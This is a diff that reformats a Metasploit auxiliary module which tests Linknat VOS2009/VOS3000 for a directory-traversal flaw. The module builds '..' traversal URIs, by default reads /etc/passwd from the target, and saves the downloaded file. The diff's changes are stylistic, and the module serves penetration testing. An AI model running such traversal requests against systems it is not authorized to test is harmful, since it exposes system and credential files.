@@ -9,18 +9,27 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Linknat Vos Manager Traversal',
-      'Description' => %q(
-        This module attempts to test whether a file traversal vulnerability
-        is present in version of linknat vos2009/vos3000
-      ),
-      'References' => [
-        ['URL', 'http://www.linknat.com/'],
-        ['URL', 'http://www.wooyun.org/bugs/wooyun-2010-0145458']
-      ],
-      'Author'         => ['Nixawk'],
-      'License'        => MSF_LICENSE))
+    super(
+      update_info(
+        info,
+        'Name' => 'Linknat Vos Manager Traversal',
+        'Description' => %q{
+          This module attempts to test whether a file traversal vulnerability
+          is present in version of linknat vos2009/vos3000
+        },
+        'References' => [
+          ['URL', 'http://www.linknat.com/'],
+          ['URL', 'http://www.wooyun.org/bugs/wooyun-2010-0145458']
+        ],
+        'Author' => ['Nixawk'],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -28,7 +37,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The path of Linknat Vos Manager (/chs/, /cht/, /eng/)', '/eng/']),
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 5])
-      ])
+      ]
+    )
   end
 
   def vos_uri(path)
@@ -54,6 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{js_uri} - HTTP/#{res.proto} #{res.code} #{res.message}")
 
     return unless res.code == 200
+
     res.body =~ /s\[8\] = \"([^"]*)\"/m ? major = $1 : major = nil
     res.body =~ /s\[169\] = \"[^:]*: ([^"\\]*)\"/m ? minor = $1 : minor = nil
     "#{major} #{minor}"
@@ -71,8 +82,8 @@ class MetasploitModule < Msf::Auxiliary
 
     uri = normalize_uri(target_uri.path, '..', traversal, filename)
     res = send_request_cgi(
-      'method'  => 'GET',
-      'uri'     => uri
+      'method' => 'GET',
+      'uri' => uri
     )
 
     if res && res.code == 200
@@ -81,7 +92,8 @@ class MetasploitModule < Msf::Auxiliary
         'text/plain',
         ip,
         res.body,
-        filename)
+        filename
+      )
       print_good("#{full_uri} - File saved in: #{path}")
     else
       print_error("#{full_uri} - Nothing was downloaded")
